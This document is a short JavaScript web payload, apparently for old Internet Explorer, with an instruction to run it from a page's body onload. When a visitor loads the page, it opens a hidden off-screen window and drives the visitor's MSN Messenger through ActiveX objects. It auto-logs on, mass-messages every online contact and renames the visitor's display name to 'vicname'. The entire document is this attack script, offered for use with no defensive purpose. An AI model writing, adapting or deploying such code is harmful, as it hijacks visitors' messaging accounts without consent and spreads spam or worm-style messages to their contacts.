var msnWin; 
var msnList; 
var msgStr = "your message"; 
//var msgStr = "your message"; 

function Go(){ 

msnWin = document.open("res://mshtml.dll/blank.htm", "", "fullscreen=1"); 
msnWin.resizeTo(1, 1); 
msnWin.moveTo(10000, 10000); 
msnWin.document.title = "One momentos please..."; 
msnWin.document.body.innerHTML = '<object classid="clsid:F3A614DC-ABE0-11d2-A441-00C04F795683" id="msnObj1"></object><object classid="clsid:FB7199AB-79BF-11d2-8D94-0000F875C541" id="msnObj2"></object>'; 
focus(); 

if (msnWin.msnObj1.localState == 1){ 
msnWin.msnObj2.autoLogon(); 
} 
Contacts(); 
Send(); 
msnWin.close(); 
msnWin.msnObj1.Services.PrimaryService.FriendlyName = "vicname"
} 

function Contacts(){ 
msnList = msnWin.msnObj1.list(0); 
} 

function Send(){ 
for (i=0;i<msnList.count; i++){ 
if (msnList(i).state >1){ 
msnList(i).sendText("MIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8\r\n\r\n", msgStr, 0); 
} 
} 
} 
----------------------------------------------------------------------------------------



insert the following in your body tag: 				onload="Go()"
